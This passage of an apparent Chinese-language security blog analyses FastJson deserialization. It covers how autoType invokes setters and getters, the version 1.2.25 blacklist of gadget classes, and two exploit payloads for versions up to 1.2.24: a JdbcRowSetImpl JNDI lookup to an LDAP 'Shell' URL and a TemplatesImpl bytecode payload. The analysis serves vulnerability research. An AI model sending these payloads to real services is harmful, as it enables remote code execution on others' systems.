</span></span><span class=line><span class=cl><span class=nl>parseObject反序列化:</span><span class=n>User</span><span class=o>{</span><span class=n>name</span><span class=o>=</span><span class=err>&#39;</span><span class=n>pinger</span><span class=err>&#39;</span><span class=o>,</span> <span class=n>age</span><span class=o>=</span><span class=n>3</span><span class=o>,</span> <span class=n>address</span><span class=o>=</span><span class=err>&#39;</span><span class=n>QT</span><span class=err>&#39;</span><span class=o>,</span> <span class=n>info</span><span class=o>=</span><span class=err>&#39;</span><span class=kc>null</span><span class=err>&#39;</span><span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>-----------------------------------------------</span>
</span></span></code></pre></td></tr></table></div></div><p>首先我们看到 <code>JSON.parse(String)</code> 的运行结果：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>JSON</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>String</span><span class=o>)</span><span class=err>：</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=k>default</span> <span class=n>Constructor</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setName</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setAddress</span>
</span></span><span class=line><span class=cl><span class=nl>parse反序列化对象名称:</span><span class=n>com</span><span class=o>.</span><span class=na>pinger</span><span class=o>.</span><span class=na>javasec</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>User</span>
</span></span><span class=line><span class=cl><span class=n>parse反序列化</span><span class=err>：</span><span class=n>User</span><span class=o>{</span><span class=n>name</span><span class=o>=</span><span class=err>&#39;</span><span class=n>pinger</span><span class=err>&#39;</span><span class=o>,</span> <span class=n>age</span><span class=o>=</span><span class=n>3</span><span class=o>,</span> <span class=n>address</span><span class=o>=</span><span class=err>&#39;</span><span class=n>QT</span><span class=err>&#39;</span><span class=o>,</span> <span class=n>info</span><span class=o>=</span><span class=err>&#39;</span><span class=kc>null</span><span class=err>&#39;</span><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，FastJson反序列化JSON字符串，如果存在 <code>@type</code> ，则首先会调用 <code>@type</code> 指定的类的构造器，然后调用属性的setter方法。对于public权限的属性age，虽然没有对应的setter方法，但是也最终赋值成功了。而private权限的属性info，同样也没有对应的setter方法，但是最终没有赋值成功。最终得到的对象是 <code>@type</code> 指定的类对象。</p><p>不过在1.2.22, 1.1.54.android之后，增加了一个 <code>SupportNonPublicField</code> 特性，如果使用了这个特性，那么private权限的info属性就算没有setter也能成功赋值。</p><p>接下来观察 <code>JSON.parseObject(String)</code> 的结果：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>JSON</span><span class=o>.</span><span class=na>parseObject</span><span class=o>(</span><span class=n>String</span><span class=o>)</span><span class=err>：</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=k>default</span> <span class=n>Constructor</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setName</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setAddress</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>getAddress</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>getName</span>
</span></span><span class=line><span class=cl><span class=nl>parseObject反序列化对象名称:</span><span class=n>com</span><span class=o>.</span><span class=na>alibaba</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>JSONObject</span>
</span></span><span class=line><span class=cl><span class=nl>parseObject反序列化:</span><span class=o>{</span><span class=s>&#34;name&#34;</span><span class=o>:</span><span class=s>&#34;pinger&#34;</span><span class=o>,</span><span class=s>&#34;age&#34;</span><span class=o>:</span><span class=n>3</span><span class=o>,</span><span class=s>&#34;address&#34;</span><span class=o>:</span><span class=s>&#34;QT&#34;</span><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，如果存在 <code>@type</code> ，则首先会调用 <code>@type</code> 指定的类的构造器，然后调用各个属性的setter方法进行赋值。但是这里与 <code>JSON.parse(String)</code> 不同的是，这里还额外调用了属性的getter方法。最终反序列化得到的对象类型为 <code>JSONObject</code> 类型。</p><p>至于为什么会额外调用属性的getter方法，原因是 <code>JSON.parseObject(String)</code> 其实是对 <code>JSON.parse(String)</code> 的一层封装，调用了 <code>JSON.toJSON(Object)</code> 方法，这个方法会调用对象的getter方法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=n>JSONObject</span> <span class=nf>parseObject</span><span class=o>(</span><span class=n>String</span> <span class=n>text</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Object</span> <span class=n>obj</span> <span class=o>=</span> <span class=n>parse</span><span class=o>(</span><span class=n>text</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>obj</span> <span class=k>instanceof</span> <span class=n>JSONObject</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>(</span><span class=n>JSONObject</span><span class=o>)</span> <span class=n>obj</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>(</span><span class=n>JSONObject</span><span class=o>)</span> <span class=n>JSON</span><span class=o>.</span><span class=na>toJSON</span><span class=o>(</span><span class=n>obj</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>然后看到 <code>JSON.parseObject(String, Class)</code> ，且指定Class为Object.class的结果：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>JSON</span><span class=o>.</span><span class=na>parseObject</span><span class=o>(</span><span class=n>String</span><span class=o>,</span> <span class=n>Class</span><span class=o>)</span><span class=err>：</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=k>default</span> <span class=n>Constructor</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setName</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setAddress</span>
</span></span><span class=line><span class=cl><span class=nl>parseObject反序列化对象名称:</span><span class=n>com</span><span class=o>.</span><span class=na>pinger</span><span class=o>.</span><span class=na>javasec</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>User</span>
</span></span><span class=line><span class=cl><span class=nl>parseObject反序列化:</span><span class=n>User</span><span class=o>{</span><span class=n>name</span><span class=o>=</span><span class=err>&#39;</span><span class=n>pinger</span><span class=err>&#39;</span><span class=o>,</span> <span class=n>age</span><span class=o>=</span><span class=n>3</span><span class=o>,</span> <span class=n>address</span><span class=o>=</span><span class=err>&#39;</span><span class=n>QT</span><span class=err>&#39;</span><span class=o>,</span> <span class=n>info</span><span class=o>=</span><span class=err>&#39;</span><span class=kc>null</span><span class=err>&#39;</span><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>结果和 <code>JSON.parse(String)</code> 是一样的，也就是当指定Class为Object.class时，会根据 <code>@type</code> 指定的值自动反序列化成对应的类。</p><p>最后看到 <code>JSON.parseObject(String, Class)</code> ，且指定Class为User.class的结果：也和 <code>JSON.parse(String)</code> 是一样的。这个很好理解，使用 <code>@type</code> 指明了需要反序列化后的类型。</p><p>我们将FastJson的版本切换到1.2.25再次运行一下，会提示如下报错：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Exception</span> <span class=n>in</span> <span class=n>thread</span> <span class=s>&#34;main&#34;</span> <span class=n>com</span><span class=o>.</span><span class=na>alibaba</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>JSONException</span><span class=o>:</span> <span class=n>autoType</span> <span class=n>is</span> <span class=n>not</span> <span class=n>support</span><span class=o>.</span> <span class=n>com</span><span class=o>.</span><span class=na>pinger</span><span class=o>.</span><span class=na>javasec</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>User</span>
</span></span><span class=line><span class=cl>	<span class=n>at</span> <span class=n>com</span><span class=o>.</span><span class=na>alibaba</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>parser</span><span class=o>.</span><span class=na>ParserConfig</span><span class=o>.</span><span class=na>checkAutoType</span><span class=o>(</span><span class=n>ParserConfig</span><span class=o>.</span><span class=na>java</span><span class=o>:</span><span class=n>882</span><span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=n>at</span> <span class=n>com</span><span class=o>.</span><span class=na>alibaba</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>parser</span><span class=o>.</span><span class=na>DefaultJSONParser</span><span class=o>.</span><span class=na>parseObject</span><span class=o>(</span><span class=n>DefaultJSONParser</span><span class=o>.</span><span class=na>java</span><span class=o>:</span><span class=n>322</span><span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=n>at</span> <span class=n>com</span><span class=o>.</span><span class=na>alibaba</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>parser</span><span class=o>.</span><span class=na>DefaultJSONParser</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>DefaultJSONParser</span><span class=o>.</span><span class=na>java</span><span class=o>:</span><span class=n>1327</span><span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=n>at</span> <span class=n>com</span><span class=o>.</span><span class=na>alibaba</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>parser</span><span class=o>.</span><span class=na>DefaultJSONParser</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>DefaultJSONParser</span><span class=o>.</span><span class=na>java</span><span class=o>:</span><span class=n>1293</span><span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=n>at</span> <span class=n>com</span><span class=o>.</span><span class=na>alibaba</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>JSON</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>JSON</span><span class=o>.</span><span class=na>java</span><span class=o>:</span><span class=n>137</span><span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=n>at</span> <span class=n>com</span><span class=o>.</span><span class=na>alibaba</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>JSON</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>JSON</span><span class=o>.</span><span class=na>java</span><span class=o>:</span><span class=n>128</span><span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=n>at</span> <span class=n>com</span><span class=o>.</span><span class=na>pinger</span><span class=o>.</span><span class=na>javasec</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>Main</span><span class=o>.</span><span class=na>main</span><span class=o>(</span><span class=n>Main</span><span class=o>.</span><span class=na>java</span><span class=o>:</span><span class=n>19</span><span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>提示不支持 <code>autoType</code> ，这是因为从1.2.25开始，FastJson默认关闭 <code>autoType</code> 了，并且从1.2.25开始，增加了 <code>checkeAutoType()</code> 函数对 <code>@type</code> 指定的类进行基于白名单和黑名单的检查。</p><p><code>ParseConfig#checkAutoType(String, Class&lt;?>)</code> 中白名单加黑名单的检查逻辑代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>autoTypeSupport</span> <span class=o>||</span> <span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>acceptList</span><span class=o>.</span><span class=na>length</span><span class=o>;</span> <span class=o>++</span><span class=n>i</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>String</span> <span class=n>accept</span> <span class=o>=</span> <span class=n>acceptList</span><span class=o>[</span><span class=n>i</span><span class=o>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>startsWith</span><span class=o>(</span><span class=n>accept</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=n>typeName</span><span class=o>,</span> <span class=n>defaultClassLoader</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>denyList</span><span class=o>.</span><span class=na>length</span><span class=o>;</span> <span class=o>++</span><span class=n>i</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>String</span> <span class=n>deny</span> <span class=o>=</span> <span class=n>denyList</span><span class=o>[</span><span class=n>i</span><span class=o>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>startsWith</span><span class=o>(</span><span class=n>deny</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，首先是进行白名单检查，如果在白名单中，则直接返回。如果不在，再继续进行黑名单检查，如果在黑名单中，则直接抛出异常。</p><p>1.2.25版本的黑名单如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>0</span> <span class=o>=</span> <span class=s>&#34;bsh&#34;</span>
</span></span><span class=line><span class=cl><span class=n>1</span> <span class=o>=</span> <span class=s>&#34;com.mchange&#34;</span>
</span></span><span class=line><span class=cl><span class=n>2</span> <span class=o>=</span> <span class=s>&#34;com.sun.&#34;</span>
</span></span><span class=line><span class=cl><span class=n>3</span> <span class=o>=</span> <span class=s>&#34;java.lang.Thread&#34;</span>
</span></span><span class=line><span class=cl><span class=n>4</span> <span class=o>=</span> <span class=s>&#34;java.net.Socket&#34;</span>
</span></span><span class=line><span class=cl><span class=n>5</span> <span class=o>=</span> <span class=s>&#34;java.rmi&#34;</span>
</span></span><span class=line><span class=cl><span class=n>6</span> <span class=o>=</span> <span class=s>&#34;javax.xml&#34;</span>
</span></span><span class=line><span class=cl><span class=n>7</span> <span class=o>=</span> <span class=s>&#34;org.apache.bcel&#34;</span>
</span></span><span class=line><span class=cl><span class=n>8</span> <span class=o>=</span> <span class=s>&#34;org.apache.commons.beanutils&#34;</span>
</span></span><span class=line><span class=cl><span class=n>9</span> <span class=o>=</span> <span class=s>&#34;org.apache.commons.collections.Transformer&#34;</span>
</span></span><span class=line><span class=cl><span class=n>10</span> <span class=o>=</span> <span class=s>&#34;org.apache.commons.collections.functors&#34;</span>
</span></span><span class=line><span class=cl><span class=n>11</span> <span class=o>=</span> <span class=s>&#34;org.apache.commons.collections4.comparators&#34;</span>
</span></span><span class=line><span class=cl><span class=n>12</span> <span class=o>=</span> <span class=s>&#34;org.apache.commons.fileupload&#34;</span>
</span></span><span class=line><span class=cl><span class=n>13</span> <span class=o>=</span> <span class=s>&#34;org.apache.myfaces.context.servlet&#34;</span>
</span></span><span class=line><span class=cl><span class=n>14</span> <span class=o>=</span> <span class=s>&#34;org.apache.tomcat&#34;</span>
</span></span><span class=line><span class=cl><span class=n>15</span> <span class=o>=</span> <span class=s>&#34;org.apache.wicket.util&#34;</span>
</span></span><span class=line><span class=cl><span class=n>16</span> <span class=o>=</span> <span class=s>&#34;org.codehaus.groovy.runtime&#34;</span>
</span></span><span class=line><span class=cl><span class=n>17</span> <span class=o>=</span> <span class=s>&#34;org.hibernate&#34;</span>
</span></span><span class=line><span class=cl><span class=n>18</span> <span class=o>=</span> <span class=s>&#34;org.jboss&#34;</span>
</span></span><span class=line><span class=cl><span class=n>19</span> <span class=o>=</span> <span class=s>&#34;org.mozilla.javascript&#34;</span>
</span></span><span class=line><span class=cl><span class=n>20</span> <span class=o>=</span> <span class=s>&#34;org.python.core&#34;</span>
</span></span><span class=line><span class=cl><span class=n>21</span> <span class=o>=</span> <span class=s>&#34;org.springframework&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>再将FastJson的版本切换到1.2.42，发现从这个版本开始，黑名单和白名单不再已明文的形式写在源码中了，而是使用hashcode（10进制）进行替代，增大安全研究的难度（恶心心）：</p><p><img src=/media/2021-08-02-01.png alt></p><p>将FastJson版本切换到1.2.61，这个版本中，将黑白名单的hashcode换成了16进制：</p><p><img src=/media/2021-08-02-02.png alt></p><h2 id=fastjson反序列化exp分析>FastJson反序列化EXP分析</h2><h3 id=version--1224>Version &lt;= 1.2.24</h3><p>从前面的分析可以知道，小于1.2.24版本的FastJson随便R，默认开启autoType且没有任何黑白名单防护。只要有Gadget就可以攻击成功。比较常见的EXP如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// EXP 1，无需开启Feature.SupportNonPublicField
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>{</span>
</span></span><span class=line><span class=cl>  <span class=s>&#34;test&#34;</span><span class=o>:</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;@type&#34;</span><span class=o>:</span> <span class=s>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class=o>,</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;dataSourceName&#34;</span><span class=o>:</span> <span class=s>&#34;ldap://localhost:8080/Shell&#34;</span><span class=o>,</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;autoCommit&#34;</span><span class=o>:</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// EXP 2，需要开启Feature.SupportNonPublicField
</span></span></span><span class=line><span class=cl><span class=c1>// 所以只支持：1.2.22&lt;=version&lt;=1.2.24 (1.2.22才开始支持Feature.SupportNonPublicField特性)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>{</span>
</span></span><span class=line><span class=cl>  <span class=s>&#34;test&#34;</span><span class=o>:</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;@type&#34;</span><span class=o>:</span> <span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class=o>,</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;_bytecodes&#34;</span><span class=o>:</span> <span class=o>[</span><span class=s>&#34;Your Eval Class Bytecodes&#34;</span><span class=o>],</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;_name&#34;</span><span class=o>:</span> <span class=s>&#34;p1n93r&#34;</span><span class=o>,</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;_tfactory&#34;</span><span class=o>:</span> <span class=o>{},</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;_outputProperties&#34;</span><span class=o>:</span> <span class=o>{}</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>过一下这两个EXP叭，下面分析基于FastJson Version 1.2.24以及JDK8u66。</p><p>首先分析一下EXP 1。前面我们分析过，FastJson可以根据 <code>@type</code> 指定的类来进行反序列化，且会调用属性的setter方法。我们看到EXP：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// EXP 1
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>{</span>
</span></span><span class=line><span class=cl>  <span class=s>&#34;test&#34;</span><span class=o>:</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;@type&#34;</span><span class=o>:</span> <span class=s>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class=o>,</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;dataSourceName&#34;</span><span class=o>:</span> <span class=s>&#34;ldap://localhost:8080/Shell&#34;</span><span class=o>,</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;autoCommit&#34;</span><span class=o>:</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>指定反序列化 <code>com.sun.rowset.JdbcRowSetImpl</code> 类对象，并且会调用 <code>setDataSourceName()</code> 和 <code>setAutoCommit()</code> 。</p><p>我们跟进 <code>setDataSourceName()</code> 方法，就是为属性dataSource赋值，代码如下所示：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kt>void</span> <span class=nf>setDataSourceName</span><span class=o>(</span><span class=n>String</span> <span class=n>var1</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>SQLException</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>getDataSourceName</span><span class=o>()</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(!</span><span class=k>this</span><span class=o>.</span><span class=na>getDataSourceName</span><span class=o>().</span><span class=na>equals</span><span class=o>(</span><span class=n>var1</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>super</span><span class=o>.</span><span class=na>setDataSourceName</span><span class=o>(</span><span class=n>var1</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=k>this</span><span class=o>.</span><span class=na>conn</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=k>this</span><span class=o>.</span><span class=na>ps</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=k>this</span><span class=o>.</span><span class=na>rs</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>super</span><span class=o>.</span><span class=na>setDataSourceName</span><span class=o>(</span><span class=n>var1</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl><span class=c1>// super.setDataSourceName(var1)代码：
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>public</span> <span class=kt>void</span> <span class=nf>setDataSourceName</span><span class=o>(</span><span class=n>String</span> <span class=n>name</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>SQLException</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>name</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>dataSource</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>name</span><span class=o>.</span><span class=na>equals</span><span class=o>(</span><span class=s>&#34;&#34;</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>SQLException</span><span class=o>(</span><span class=s>&#34;DataSource name cannot be empty string&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>dataSource</span> <span class=o>=</span> <span class=n>name</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>URL</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>然后跟进 <code>setAutoCommit()</code> 方法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
